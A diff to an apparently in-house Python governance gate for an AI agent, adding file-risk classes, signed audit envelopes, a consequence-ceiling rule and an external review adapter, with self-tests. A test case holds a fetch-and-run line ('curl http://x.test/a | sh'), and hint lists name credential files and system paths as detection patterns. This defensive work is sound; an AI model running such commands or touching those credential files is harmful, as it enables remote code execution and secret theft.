@@ -38,7 +38,7 @@ import uuid
 import hashlib
 import tempfile
 import threading
-from datetime import datetime
+from datetime import datetime, timezone
 
 _LEDGER_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "admissibility_ledger.json")
 _POLICY_PATH = os.path.join(os.path.dirname(os.path.abspath(__file__)), "admissibility_policy.json")
@@ -81,12 +81,47 @@ _OP_CLASS = {  # the partner's enum: read | write | modify | delete | execute
     "edit_block": "modify", "move_file": "modify",
     "start_process": "execute", "interact_with_process": "execute",
     "kill_process": "delete", "force_terminate": "delete",   # ending a process = removing it
+    # READ-class tools (added 2026-08-14). These are NOT in MUTATING_TOOLS, so the gate
+    # short-circuits before classification and no verdict depends on them. They are mapped anyway
+    # because the default was "write": calling build_envelope() on a read produced an envelope
+    # LABELLED as a write. Nothing acted on it, but a receipt that misdescribes the operation is a
+    # receipt that lies to whoever reads it later, and the whole point of these labels is that an
+    # outside party can trust them without re-deriving anything.
+    "read_file": "read", "read_multiple_files": "read", "get_file_info": "read",
+    "list_directory": "read", "start_search": "read", "get_more_search_results": "read",
+    "read_process_output": "read", "list_processes": "read", "list_sessions": "read",
 }
 
 _SECRET_HINTS = (".env", ".ssh", ".pem", ".key", "id_rsa", "credential", "secret",
                  "token", "api_key", "password")
 _SYSTEM_HINTS = ("c:\\windows", "c:/windows", "system32", "program files", "\\drivers\\",
                  "/etc/", "/usr/", "/bin/")
+
+# ── 9-class file taxonomy (2026-08-13, agreed with the external governance partner) ─────────────
+# The partner's constraint, and the reason this taxonomy is shaped the way it is: in their engine
+# ONLY `risk_class` and `irreversible` move a verdict (low/medium -> ALLOW, high/critical -> REVIEW,
+# irreversible=true -> REVIEW regardless). So a class earns its existence only if it moves a target
+# across the medium/high line. Everything else is semantic resolution that changes no outcome.
+#
+# The five-class version pinned every file at one extreme or the other: secrets and system were both
+# CRITICAL, everything else medium or low. There was no medium/high boundary at all, which meant any
+# path matching a system hint — including an ordinary build config — was held for review. That is a
+# false deny, and false denies are what get a control switched off.
+#
+# HOST config vs BUILD config is the split that matters and it was the partner's correction to a
+# first draft that had them merged at medium. A hosts file or service config is host-level authority;
+# a repo-local build config is versionable and restorable. Same word "config", different blast radius.
+_HOST_CONFIG_HINTS = ("\\drivers\\etc\\", "/etc/hosts", "hosts", "\\system32\\config",
+                      "resolv.conf", "sshd_config", "nginx.conf", "httpd.conf", "iptables",
+                      "firewall", "\\inetsrv\\", "systemd", ".service")
+_BUILD_CONFIG_HINTS = ("pyproject.toml", "setup.cfg", "setup.py", "tsconfig", "webpack",
+                       "vite.config", "babel.config", ".eslintrc", "dockerfile",
+                       "docker-compose", "makefile", ".editorconfig", "pytest.ini", "tox.ini")
+# A write here is a supply-chain edit: the next install executes whatever it now says. Promoted from
+# `project` (medium -> ALLOW) to high (-> REVIEW). This is the only promotion that costs latency.
+_DEPENDENCY_MANIFEST_HINTS = ("requirements.txt", "package.json", "package-lock.json", "yarn.lock",
+                              "poetry.lock", "pipfile", "gemfile", "go.mod", "go.sum", "cargo.toml")
+_VCS_INTERNAL_HINTS = ("\\.git\\", "/.git/", "\\.git/", "/.git\\")
 _SANDBOX_HINTS = ("drill_workspace", "\\temp\\", "/tmp/", "appdata\\local\\temp", "sandbox",
                   "governance_audit", "probe_")
 
@@ -110,15 +145,37 @@ _PKG_INSTALL_HINTS = ("pip install", "pip3 install", "pip.exe install", "npm ins
 
 
 def _classify_file_target(raw_path: str) -> str:
-    """sandbox | project | user_space | system | secrets — from the raw path, locally only.
-    Precedence: secrets > system > sandbox > user_space > project (a .ssh path must never be
-    downgraded by also matching user_space)."""
+    """credentials | system_binary | host_config | build_config | dependency_manifest |
+    vcs_internal | user_space | project | sandbox — from the raw path, locally only.
+
+    PRECEDENCE IS LOAD-BEARING and runs most-dangerous-first, because a single path routinely
+    matches several classes and the highest must win. `C:\\Windows\\System32\\drivers\\etc\\hosts`
+    matches both system_binary and host_config; `.../.git/config` matches vcs_internal and
+    build_config; a `.env` under the repo matches credentials and project. Reordering this silently
+    downgrades exactly the targets the taxonomy exists to catch.
+
+    `credentials` stays first and absolute: a credential is a credential wherever it lives.
+    """
     p = (raw_path or "").lower().replace("/", "\\")
-    if any(h.replace("/", "\\") in p for h in _SECRET_HINTS):
-        return "secrets"
-    if any(h.replace("/", "\\") in p for h in _SYSTEM_HINTS):
-        return "system"
-    if any(h.replace("/", "\\") in p for h in _SANDBOX_HINTS):
+    def has(hints):
+        return any(h.replace("/", "\\") in p for h in hints)
+
+    if has(_SECRET_HINTS):
+        return "credentials"
+    # `.git\` also has to match at the START of a relative path. The hint list is separator-anchored
+    # so `E:\proj\.git\config` matches on `\.git\`, but a bare `.git/config` has nothing before it —
+    # and relative paths are exactly what the ReAct loop emits most often.
+    if has(_VCS_INTERNAL_HINTS) or p.startswith(".git\\"):
+        return "vcs_internal"          # before system/build: .git/config is VCS, not build config
+    if has(_HOST_CONFIG_HINTS):
+        return "host_config"           # before system_binary: hosts/service files are config, not binaries
+    if has(_SYSTEM_HINTS):
+        return "system_binary"
+    if has(_DEPENDENCY_MANIFEST_HINTS):
+        return "dependency_manifest"   # supply-chain surface; outranks build_config and project
+    if has(_BUILD_CONFIG_HINTS):
+        return "build_config"
+    if has(_SANDBOX_HINTS):
         return "sandbox"
     if p.startswith("c:\\users\\") or p.startswith("\\users\\"):
         return "user_space"
@@ -159,9 +216,26 @@ def _risk_class(tool: str, target_class: str, raw: str) -> str:
             return "medium"
         return {"shell": "critical", "system_service": "high",
                 "project_script": "low", "dev_tool": "low"}.get(target_class, "medium")
-    # file ops
-    return {"secrets": "critical", "system": "critical",
-            "user_space": "medium", "project": "medium", "sandbox": "low"}.get(target_class, "medium")
+    # File ops. Partner-agreed mapping, 2026-08-13. Their verdict rule is low/medium -> ALLOW and
+    # high/critical -> REVIEW, so the medium/high line below IS the governance boundary; the
+    # critical/high distinction adds severity resolution without changing a verdict.
+    #
+    # NOTE the deliberate absence: nothing here sets `irreversible`. That stays derived purely from
+    # operation semantics in _is_irreversible(). A first draft had vcs_internal force irreversible=true
+    # because a history rewrite cannot be undone — the partner rejected it, correctly: coupling the two
+    # would make it impossible to tell whether a REVIEW came from what was touched or from what was
+    # done to it. A .git READ is not irreversible; `git reset --hard` is, and the operation says so.
+    return {
+        "credentials":         "critical",   # a credential is a credential wherever it lives
+        "system_binary":       "critical",
+        "host_config":         "high",       # host-level authority: hosts, services, firewall
+        "dependency_manifest": "high",       # supply chain — the next install runs what this says
+        "vcs_internal":        "high",       # history and refs; severity only, see note above
+        "build_config":        "medium",     # repo-local, versionable, restorable
+        "user_space":          "medium",
+        "project":             "medium",
+        "sandbox":             "low",
+    }.get(target_class, "medium")
 
 
 def _risk_fields(tool_name: str, local_ctx: dict) -> dict:
@@ -196,6 +270,93 @@ def is_mutating(tool_name: str) -> bool:
     return t in MUTATING_TOOLS or any(h in t for h in _MUTATING_HINTS)
 
 
+# ── Envelope binding: policy version + local signature (2026-08-10) ───────────────
+#
+# An external reviewer's question that prompted both of these: is the verdict bound to the executable
+# params, the policy version and the target hash, so the action cannot mutate between authorization and
+# execution? The honest answer was that the binding was STRUCTURAL, the signature field was empty, and
+# there was no policy version at all. These two close the cheap half of that.
+#
+# What this does NOT do, stated plainly so nobody reads more into it: it does not solve
+# time-of-check-to-time-of-use. Signing the envelope proves the envelope was not altered after the gate
+# saw it; it does NOT prove the action executed matches the action adjudicated. That needs the verdict
+# re-checked against the actual arguments at execution time, which is a design change, not a field.
+
+_SIG_ALG = "ed25519"
+
+
+def _policy_version() -> str:
+    """Identify the ruleset that produced a verdict, so a receipt can be re-adjudicated later.
+
+    Content-derived by default rather than a hand-maintained string, because a hand-maintained version
+    silently goes stale the moment someone edits the policy and forgets to bump it. `POLICY_VERSION`
+    overrides when an external convention requires a specific label.
+    """
+    override = os.getenv("POLICY_VERSION", "").strip()
+    if override:
+        return override
+    try:
+        with open(_POLICY_PATH, "rb") as fh:
+            return "sha256:" + hashlib.sha256(fh.read()).hexdigest()[:12]
+    except Exception:
+        return "unversioned"
+
+
+def _signing_key():
+    """The Ed25519 private key, or None when unconfigured.
+
+    NEVER generates one. A per-process ephemeral key is worse than no key: it produces signatures that
+    look valid and can never be verified again after a restart. That exact failure cost a partner an
+    entire run's worth of verifiable receipts (their signing key fell through to a random generate()),
+    and it is not being repeated here.
+    """
+    import base64
+    seed = os.getenv("ADMISSIBILITY_SIGNING_KEY", "").strip()
+    if not seed:
+        return None
+    try:
+        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey
+        return Ed25519PrivateKey.from_private_bytes(base64.b64decode(seed))
+    except Exception:
+        return None
+
+
+def canonical_envelope_bytes(envelope: dict) -> bytes:
+    """The exact bytes a signature covers: canonical JSON (sorted keys, no whitespace drift) of every
+    field EXCEPT the two signature fields themselves, which would otherwise be self-referential."""
+    body = {k: v for k, v in envelope.items() if k not in ("signature", "signature_alg")}
+    return json.dumps(body, sort_keys=True, separators=(",", ":")).encode()
+
+
+def _apply_signature(envelope: dict) -> None:
+    """Sign in place. Degrades to an empty signature when unconfigured — the gate must keep working."""
+    key = _signing_key()
+    if key is None:
+        return
+    import base64
+    envelope["signature"] = base64.b64encode(key.sign(canonical_envelope_bytes(envelope))).decode()
+    envelope["signature_alg"] = _SIG_ALG
+
+
+def verify_envelope(envelope: dict, public_key_b64: str) -> bool:
+    """Verify an envelope's signature against a base64 Ed25519 public key.
+
+    Exists so the binding claim is DEMONSTRABLE rather than asserted — a third party can check a
+    receipt without any of this code. Returns False on any failure rather than raising.
+    """
+    import base64
+    try:
+        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PublicKey
+        sig = envelope.get("signature") or ""
+        if not sig:
+            return False
+        pub = Ed25519PublicKey.from_public_bytes(base64.b64decode(public_key_b64))
+        pub.verify(base64.b64decode(sig), canonical_envelope_bytes(envelope))
+        return True
+    except Exception:
+        return False
+
+
 def build_envelope(tool_name: str, args: dict, task_id=None) -> dict:
     """The ABSTRACT governance envelope — metadata only, never content (see PRIVACY FLOOR)."""
     args = args if isinstance(args, dict) else {}
@@ -204,9 +365,16 @@ def build_envelope(tool_name: str, args: dict, task_id=None) -> dict:
     arg_summary = {k: f"<{type(v).__name__}:{len(str(v))}ch>" for k, v in args.items()}
     envelope = {
         "agent_id": os.getenv("ADMISSIBILITY_AGENT_ID", "clara-01"),
-        "timestamp": datetime.now().isoformat(timespec="seconds"),
+        # UTC + explicit offset. Was naive local time with no suffix, which is wrong for a record meant
+        # to be ordered and verified later by someone in another timezone (found 2026-08-10 while
+        # formatting receipts for an external reviewer).
+        "timestamp": datetime.now(timezone.utc).isoformat(timespec="seconds"),
         "nonce": uuid.uuid4().hex,
-        "signature": "",                       # local phase 0 — signing lands with the partner_a adapter
+        "policy_version": _policy_version(),   # LOCAL ruleset identity. NOT the deciding ruleset on the
+                                               # external path, where the partner engine decides and
+                                               # this file is never read (found by a reviewer, 08-23)
+        "signature": "",                       # filled at the END of this function, over everything else
+        "signature_alg": "",
         "tool": tool_name,
         "intent": _INTENTS.get(tool_name, "mutate_state"),
         "target_type": "process" if "process" in (tool_name or "") else "local_file",
@@ -226,6 +394,9 @@ def build_envelope(tool_name: str, args: dict, task_id=None) -> dict:
     # the partner B run #1 showed the engine reaches hard-DENY via this signal, so under-marking it
     # sent destructive commands mislabeled as reversible. Coarse boolean only; the raw string stays local.
     envelope["irreversible"] = _is_irreversible(tool_name, envelope["operation_class"], path)
+    # Sign LAST, so the signature covers every other field including the risk metadata and the
+    # irreversible flag. Signing earlier would leave exactly the governance-relevant fields unbound.
+    _apply_signature(envelope)
     return envelope
 
 
@@ -448,13 +619,211 @@ def _partner_b_evaluate(envelope, local_ctx):
                       f"evidence_id={ev_id} sig={sig}")
 
 
+# ── Consequence ceiling (partner C convention, agreed 2026-08-09/10) ──────────────
+#
+# Partner C's request surface wants a declared CONSEQUENCE CEILING rather than a bare risk class. The
+# rule they specified:
+#
+#     consequence_ceiling = max(tier_from_risk_class, T_IRREVERSIBLE if irreversible else T_MIN)
+#
+# `irreversible` acts as a FORCED FLOOR: an irreversible action can never resolve to anything more
+# permissive than "irreversible-requires-authorization" regardless of its risk tier, because the ceiling
+# must describe what the command actually DOES, not the category it happens to sit in. A medium-risk
+# delete flagged irreversible therefore arrives at their side at the irreversible tier.
+#
+# Implemented as a real max() over an ORDERED scale, not a special-case `if`. The `if` form silently
+# breaks the moment a risk class maps ABOVE the floor — it would drag a critical action back DOWN to the
+# irreversible tier. max() is monotone and cannot do that.
+#
+# BOTH tiers are surfaced (their 2026-08-10 request): `pre_floor_tier` is captured BEFORE the floor is
+# applied, so a later disagreement is diagnosable rather than mysterious. Divergent pre_floor_tier means
+# the two CLASSIFIERS disagree; matching pre_floor_tier with a divergent ceiling means the FLOOR RULE
+# disagrees. Collapsing them into one field would merge two different conversations.
+#
+# ⚠️ TIER NAMES: only the two tiers below are CONFIRMED on the record with partner C. Their "three-tier
+# baseline" has a third, lowest tier whose exact string was never written down in any exchange I can
+# find. Rather than invent a string and put it on the wire, T_MIN currently ALIASES the confirmed
+# reversible tier, so nothing unconfirmed is ever transmitted. `PARTNER_C_TIER_MIN` overrides it the
+# moment they name it, and the scale below is already ordered to accept it.
+_CEILING_T_MIN = os.getenv("PARTNER_C_TIER_MIN", "reversible-bounded").strip()
+_CEILING_REVERSIBLE = "reversible-bounded"
+_CEILING_IRREVERSIBLE = "irreversible-requires-authorization"
+
+# Ordered low -> high. Deduped so the aliased T_MIN does not create a phantom rung.
+_CEILING_SCALE = tuple(dict.fromkeys((_CEILING_T_MIN, _CEILING_REVERSIBLE, _CEILING_IRREVERSIBLE)))
+
+_RISK_TO_CEILING = {
+    "low": _CEILING_T_MIN,
+    "medium": _CEILING_REVERSIBLE,
+    "high": _CEILING_IRREVERSIBLE,
+    "critical": _CEILING_IRREVERSIBLE,
+}
+
+
+def _ceiling_rank(tier: str) -> int:
+    """Position on the ordered scale. Unknown tiers rank highest (conservative: never silently
+    downgrade something we do not recognise)."""
+    try:
+        return _CEILING_SCALE.index(tier)
+    except ValueError:
+        return len(_CEILING_SCALE)
+
+
+def consequence_ceiling(risk_class: str, irreversible: bool) -> tuple:
+    """Return (pre_floor_tier, resolved_consequence_ceiling) for partner C's request surface.
+
+    pre_floor_tier — what the risk classifier alone produced.
+    resolved       — after the irreversible floor is applied.
+
+    The two are equal whenever the floor did not bite, which is the common case.
+    """
+    pre = _RISK_TO_CEILING.get((risk_class or "").strip().lower(), _CEILING_T_MIN)
+    if not irreversible:
+        return pre, pre
+    floor = _CEILING_IRREVERSIBLE
+    resolved = pre if _ceiling_rank(pre) >= _ceiling_rank(floor) else floor
+    return pre, resolved
+
+
+# The authority CLARA acts under. Self-held local governance, not a delegated mandate from a third
+# party — stated honestly rather than claiming an anchor that does not exist.
+PARTNER_C_AUTHORITY_REF = "clara:local-governance-policy/v1"
+PARTNER_C_TTL_S = 3600
+
+
+def build_partner_c_scan(envelope: dict, session_id: str = "") -> dict:
+    """Build the partner C `scan()` request from an abstract envelope.
+
+    SCHEMA REWRITTEN 2026-08-12 against the DELIVERED sandbox (EAGA-v1 / adapter 1.0.1), verified live.
+    The previous version was written to an earlier spec and was rejected 422 INVALID_ENVELOPE: it sent
+    five SPI *scores* (`authority_score`, `mandate_score`, …) plus a nested `metadata` block, whereas
+    the shipped API requires ten top-level fields and computes its own dimension results from the
+    *refs* we supply. Those scores are therefore gone — their engine derives them, we do not assert
+    them. Only `session_id` survived from the old payload.
+
+    Shapes below were established by probing the live API and then CONFIRMED/CORRECTED by the partner
+    in writing (2026-08-12). Do not "tidy" them without re-testing:
+      * `temporal_context` carries **`requested_at`** as an RFC-3339 timestamp. That field alone
+        satisfies their temporal check. Every other shape tried (`timestamp`, `valid_from`/`valid_until`,
+        `not_before`/`not_after`, `issued_at`/`expires_at`) returned TEMPORAL_NO_RECOGNIZED_FIELD.
+        **CORRECTION 2026-08-12: `ttl_seconds` is NOT a recognized field** — an earlier version sent it
+        and the request succeeded, but on `requested_at` alone. It was cargo cult, now removed. Their
+        documented alternative form is `evaluation_window_seconds`.
+      * `risk_class` / `irreversible` / `pre_floor_tier` / `resolved_consequence_ceiling` belong at
+        TOP LEVEL — confirmed by the partner as the canonical location. Values placed only inside
+        `risk_context` were treated as contextual metadata and could be silently ignored.
+      * **`resolved_consequence_ceiling` is the request-side field name** for our own resolved ceiling.
+        Five guesses failed to find it (`clara_resolved_ceiling`, `resolved_ceiling`,
+        `consequence_ceiling`, `clara_ceiling`, `agent_resolved_ceiling`) because it was undocumented,
+        not because the capability was missing. They return ours as
+        `clara_consequence_ceiling.clara_resolved_ceiling`, their own independently-resolved value as
+        the sibling `*_resolved_ceiling` field, and flag any disagreement in `.consistency_note` — which
+        is the whole point of sending it.
+        Note the name was already in our own `consequence_ceiling()` docstring.
+
+    The privacy floor holds exactly as for partners A and B: built from the ENVELOPE only, so the real
+    path/command never leaves the machine — `scope_ref` and `payload_hash` carry hashes, never paths.
+    """
+    risk = envelope.get("risk_class", "")
+    irreversible = bool(envelope.get("irreversible", False))
+    pre_floor, resolved = consequence_ceiling(risk, irreversible)
+    action_class = envelope.get("operation_class") or envelope.get("intent") or envelope.get("tool", "")
+    tgt_hash = envelope.get("target_path_hash", "")
+    now = datetime.now(timezone.utc)
+
+    return {
+        # --- the ten fields the shipped API requires ---
+        "agent_id": envelope.get("agent_id", "") or "clara-01",
+        "session_id": session_id or envelope.get("task_id", "") or uuid.uuid4().hex,
+        "action_type": action_class,
+        "requested_consequence": resolved,
+        "authority_ref": PARTNER_C_AUTHORITY_REF,
+        "mandate_ref": None,             # null = unanchored delegation; a valid state, not an error
+        "scope_ref": f"{envelope.get('target_type', 'file')}::{tgt_hash}",
+        "temporal_context": {"requested_at": now.isoformat()},
+        "risk_context": {"risk_class": risk, "irreversible": irreversible},
+        "payload_hash": hashlib.sha256(
+            json.dumps({"action": action_class, "target": tgt_hash}, sort_keys=True).encode()
+        ).hexdigest(),
+        # --- consequence-boundary inputs: TOP LEVEL is canonical (partner-confirmed) ---
+        "risk_class": risk,
+        "irreversible": irreversible,
+        "pre_floor_tier": pre_floor,
+        "resolved_consequence_ceiling": resolved,   # -> clara_consequence_ceiling.clara_resolved_ceiling
+        "trigger": "PRE_EXECUTION",
+    }
+
+
+# Their record verdicts -> CLARA's vocabulary. CONTESTED means "flagged for review, does not execute
+# without an override", which is exactly REVIEW. VOID is NOT a verdict about the action — it means the
+# record itself is not valid — so it raises and lets the gate's fail-open/closed policy decide, rather
+# than being silently coerced into an ALLOW.
+_PARTNER_C_VERDICT = {"CLEAR": ALLOW, "BLOCKED": DENY, "CONTESTED": REVIEW}
+
+# Their EXTERNAL vocabulary (top-level `verdict`), used only as a fallback when `internal_cbap_verdict`
+# is absent. Deliberately NOT the primary read: the external set is coarser and has no CONTESTED, so
+# mapping from it alone would flatten a flagged-for-review record into a plain allow.
+_PARTNER_C_EXTERNAL = {"ALLOW": "CLEAR", "DENY": "BLOCKED", "BLOCK": "BLOCKED",
+                       "REVIEW": "CONTESTED", "ESCALATE": "CONTESTED", "VOID": "VOID"}
+
+
+def _partner_c_evaluate(envelope, local_ctx):
+    """partner C consequence-boundary adapter. DORMANT until PARTNER_C_API_KEY + PARTNER_C_URL are set.
+
+    POSTs the abstract envelope as a scan request and maps the returned consequence-boundary record.
+    Carries the record's identity handles (id, verdict, composite score, sequence number) into the
+    ledger reason so every governed action keeps a verifiable third-party receipt, same as partner B.
+
+    Any transport/shape failure RAISES — a renamed field degrades to a loud error rather than a silent
+    ALLOW, which is the entire point of a governance adapter.
+    """
+    import requests as _rq
+    key = os.getenv("PARTNER_C_API_KEY", "").strip()
+    url = os.getenv("PARTNER_C_URL", "").strip()
+    if not key or not url:
+        raise RuntimeError("partner_c: PARTNER_C_API_KEY / PARTNER_C_URL not configured")
+
+    # Sandbox authenticates with a scoped custom header; production CBAP uses Bearer. Configurable so
+    # the same adapter serves both — the delivered sandbox rejects Authorization: Bearer.
+    auth_header = os.getenv("PARTNER_C_AUTH_HEADER", "Authorization").strip() or "Authorization"
+    auth_value = key if auth_header.lower() != "authorization" else f"Bearer {key}"
+
+    payload = build_partner_c_scan(envelope)
+    r = _rq.post(url.rstrip("/") + "/scan", json=payload,
+                 headers={auth_header: auth_value, "Content-Type": "application/json"},
+                 timeout=float(os.getenv("PARTNER_C_TIMEOUT_S", "8")))
+    r.raise_for_status()
+    data = r.json() or {}
+
+    # They return TWO vocabularies: `internal_cbap_verdict` (CLEAR/BLOCKED/CONTESTED) and a top-level
+    # `verdict` (ALLOW/...). Prefer the internal one — it is the finer-grained of the two and CONTESTED
+    # has no top-level equivalent, so reading only `verdict` would silently flatten a review to an allow.
+    raw = str(data.get("internal_cbap_verdict") or "").strip().upper()
+    if not raw:
+        raw = _PARTNER_C_EXTERNAL.get(str(data.get("verdict") or "").strip().upper(), "")
+    if raw == "VOID":
+        raise RuntimeError(f"partner_c: record VOID (cbr_id={str(data.get('cbr_id',''))[:24]})")
+    if raw not in _PARTNER_C_VERDICT:
+        raise RuntimeError(
+            f"partner_c: unknown verdict internal={data.get('internal_cbap_verdict')!r} "
+            f"external={data.get('verdict')!r}")
+
+    return _PARTNER_C_VERDICT[raw], (
+        f"partner_c: verdict={raw} external={data.get('verdict')} "
+        f"cbr_id={str(data.get('cbr_id',''))[:28]} reason={data.get('reason_code')} "
+        f"envelope_hash={str(data.get('envelope_hash',''))[:23]} "
+        f"adapter={data.get('adapter_codename')}/{data.get('adapter_version')} "
+        f"sandbox={data.get('sandbox_only')} pre_floor={payload['pre_floor_tier']} "
+        f"ceiling={payload['requested_consequence']}")
+
+
 _ADAPTERS = {"noop": _noop_evaluate, "policy": _policy_evaluate, "partner_a": _partner_a_evaluate,
-             "partner_b": _partner_b_evaluate}
+             "partner_b": _partner_b_evaluate, "partner_c": _partner_c_evaluate}
 
 # Adapters whose evaluate() does network I/O (slow, up to the adapter's TIMEOUT_S). In SHADOW mode
 # their verdict is never enforced, so the gate runs them fire-and-forget — the hot path never waits
 # on a round-trip. Kept as a mutable set so the self-test can register a fake remote adapter.
-_REMOTE_ADAPTERS = {"partner_a", "partner_b"}
+_REMOTE_ADAPTERS = {"partner_a", "partner_b", "partner_c"}
 
 
 def _adapter():
@@ -685,9 +1054,30 @@ if __name__ == "__main__":
         ("write_file", {"path": "drill_workspace/audit/note.txt"}, "sandbox", "write", "low"),
         ("write_file", {"path": "core_logic/crud.py"}, "project", "write", "medium"),
         ("write_file", {"path": "C:\\Users\\alkam\\Documents\\r.docx"}, "user_space", "write", "medium"),
-        ("write_file", {"path": "C:\\Windows\\System32\\drivers\\etc\\hosts"}, "system", "write", "critical"),
-        ("write_file", {"path": "core_logic/.env"}, "secrets", "write", "critical"),
-        ("write_file", {"path": "C:\\Users\\alkam\\.ssh\\config"}, "secrets", "write", "critical"),
+        # 9-class taxonomy (2026-08-13). `secrets`->`credentials`, `system` split into
+        # `system_binary` (critical) and `host_config` (high). The hosts file MOVED critical->high
+        # and still lands REVIEW; the severity label changed, the governance outcome did not.
+        ("write_file", {"path": "C:\\Windows\\System32\\drivers\\etc\\hosts"}, "host_config", "write", "high"),
+        ("write_file", {"path": "C:\\Windows\\System32\\kernel32.dll"}, "system_binary", "write", "critical"),
+        ("write_file", {"path": "core_logic/.env"}, "credentials", "write", "critical"),
+        ("write_file", {"path": "C:\\Users\\alkam\\.ssh\\config"}, "credentials", "write", "critical"),
+        # The two PROMOTIONS — these were `project`/medium (ALLOW) before and are now high (REVIEW).
+        ("write_file", {"path": "requirements.txt"}, "dependency_manifest", "write", "high"),
+        ("write_file", {"path": "interface/package.json"}, "dependency_manifest", "write", "high"),
+        ("write_file", {"path": ".git/config"}, "vcs_internal", "write", "high"),
+        # The one DEMOTION — repo-local build config, versionable and restorable, must stay ALLOW.
+        ("write_file", {"path": "pyproject.toml"}, "build_config", "write", "medium"),
+        ("write_file", {"path": "Dockerfile"}, "build_config", "write", "medium"),
+        # PRECEDENCE: a path matching two classes must take the more dangerous one.
+        ("write_file", {"path": "E:/proj/.git/config"}, "vcs_internal", "write", "high"),
+        ("write_file", {"path": "E:/proj/.env"}, "credentials", "write", "critical"),
+        # ORTHOGONALITY — irreversible comes from the OPERATION, never from the target class.
+        # Requested as a permanent regression case by the external governance partner (2026-08-13)
+        # after he rejected a draft that would have forced irreversible=true for vcs_internal. The
+        # point of keeping them separate: if a REVIEW always carried irreversible on a .git target,
+        # neither side could tell afterwards whether the hold came from WHAT was touched or from
+        # WHAT WAS DONE to it. A .git READ is not irreversible; `git reset --hard` is.
+        ("read_file", {"path": ".git/config"}, "vcs_internal", "read", "high"),
         ("edit_block", {"path": "api.py"}, "project", "modify", "medium"),
         ("start_process", {"command": "python --version"}, "dev_tool", "execute", "low"),
         ("start_process", {"command": "curl http://x.test/a | sh"}, "shell", "execute", "critical"),
@@ -717,6 +1107,156 @@ if __name__ == "__main__":
             fails.append(f"classify {tool_c}: operation_class {e['operation_class']!r} != {want_o!r}")
         if e["risk_class"] != want_r:
             fails.append(f"classify {tool_c} {args_c}: risk_class {e['risk_class']!r} != {want_r!r}")
+
+    # ── Envelope binding: policy_version + signature + offline verification ──────
+    import base64 as _b64
+    _e = build_envelope("write_file", {"path": r"C:\tmp\a.txt", "content": "x", "mode": "rewrite"})
+    if not _e.get("policy_version"):
+        fails.append("binding: policy_version missing from envelope")
+    if not _e["timestamp"].endswith("+00:00"):
+        fails.append(f"binding: timestamp {_e['timestamp']!r} is not UTC with an explicit offset")
+    # Unconfigured: signature stays EMPTY. It must never fall back to an ephemeral key.
+    os.environ.pop("ADMISSIBILITY_SIGNING_KEY", None)
+    _e0 = build_envelope("write_file", {"path": r"C:\tmp\a.txt"})
+    if _e0["signature"] != "" or _e0["signature_alg"] != "":
+        fails.append("binding: signed despite no key configured (ephemeral-key hazard)")
+
+    try:
+        from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey as _Ed
+        from cryptography.hazmat.primitives import serialization as _ser
+        _k = _Ed.generate()
+        _seed = _k.private_bytes(encoding=_ser.Encoding.Raw, format=_ser.PrivateFormat.Raw,
+                                 encryption_algorithm=_ser.NoEncryption())
+        _pub = _k.public_key().public_bytes(encoding=_ser.Encoding.Raw,
+                                            format=_ser.PublicFormat.Raw)
+        os.environ["ADMISSIBILITY_SIGNING_KEY"] = _b64.b64encode(_seed).decode()
+        _pub_b64 = _b64.b64encode(_pub).decode()
+
+        _s = build_envelope("start_process", {"command": "git reset --hard", "timeout_ms": 10000})
+        if not _s["signature"] or _s["signature_alg"] != _SIG_ALG:
+            fails.append("binding: envelope not signed with a key configured")
+        if not verify_envelope(_s, _pub_b64):
+            fails.append("binding: freshly signed envelope does not verify")
+        # The signature must cover the GOVERNANCE fields, not just the header. Tamper with each and
+        # verification must fail — otherwise the binding is decorative.
+        for _field, _bad in (("risk_class", "low"), ("irreversible", False),
+                             ("target_path_hash", "0" * 16), ("policy_version", "pol-fake")):
+            _t = dict(_s); _t[_field] = _bad
+            if verify_envelope(_t, _pub_b64):
+                fails.append(f"binding: tampering with {_field!r} still verifies — field not covered")
+        # A wrong key must not verify.
+        _other = _Ed.generate().public_key().public_bytes(
+            encoding=_ser.Encoding.Raw, format=_ser.PublicFormat.Raw)
+        if verify_envelope(_s, _b64.b64encode(_other).decode()):
+            fails.append("binding: verified against the WRONG public key")
+        # An unsigned envelope must not verify.
+        if verify_envelope(_e0, _pub_b64):
+            fails.append("binding: unsigned envelope reported as verified")
+    except ImportError:
+        pass  # cryptography absent — signing degrades, which the unconfigured case above already pins
+    finally:
+        os.environ.pop("ADMISSIBILITY_SIGNING_KEY", None)
+
+    # ── Consequence ceiling + partner C scan payload ─────────────────────────────
+    # The floor rule must be a real max() over an ordered scale. The cases that matter are the ones a
+    # special-case `if` would get wrong.
+    T_REV, T_IRR = _CEILING_REVERSIBLE, _CEILING_IRREVERSIBLE
+    ceiling_cases = [
+        # (risk_class, irreversible, want_pre_floor, want_resolved, why)
+        ("low",      False, _CEILING_T_MIN, _CEILING_T_MIN, "no floor, lowest tier"),
+        ("medium",   False, T_REV,  T_REV,  "no floor, reversible stays reversible"),
+        ("high",     False, T_IRR,  T_IRR,  "high already at the irreversible tier without the floor"),
+        ("critical", False, T_IRR,  T_IRR,  "critical likewise"),
+        # THE worked example partner C wrote out on 2026-08-10 — must reproduce exactly.
+        ("medium",   True,  T_REV,  T_IRR,  "floor BITES: medium delete flagged irreversible"),
+        ("low",      True,  _CEILING_T_MIN, T_IRR, "floor bites from the bottom too"),
+        # The case a special-case `if` breaks: already at/above the floor must NOT be dragged down.
+        ("critical", True,  T_IRR,  T_IRR,  "floor must not DOWNGRADE an already-high tier"),
+        # Unknown risk class must not silently resolve to something permissive.
+        ("",         True,  _CEILING_T_MIN, T_IRR, "unknown risk + irreversible still floors"),
+    ]
+    for risk_c, irr_c, want_pre, want_res, why in ceiling_cases:
+        pre, res = consequence_ceiling(risk_c, irr_c)
+        if pre != want_pre:
+            fails.append(f"ceiling[{why}]: pre_floor {pre!r} != {want_pre!r}")
+        if res != want_res:
+            fails.append(f"ceiling[{why}]: resolved {res!r} != {want_res!r}")
+
+    # An unknown tier must rank HIGHEST, never silently downgrade.
+    if _ceiling_rank("some-tier-we-do-not-know") < _ceiling_rank(T_IRR):
+        fails.append("ceiling: unknown tier ranked below the irreversible floor")
+
+    # Scan payload — REWRITTEN 2026-08-12 for the delivered EAGA-v1 schema (the old assertions checked
+    # SPI scores + a `metadata` block that the shipped API rejects with 422 INVALID_ENVELOPE).
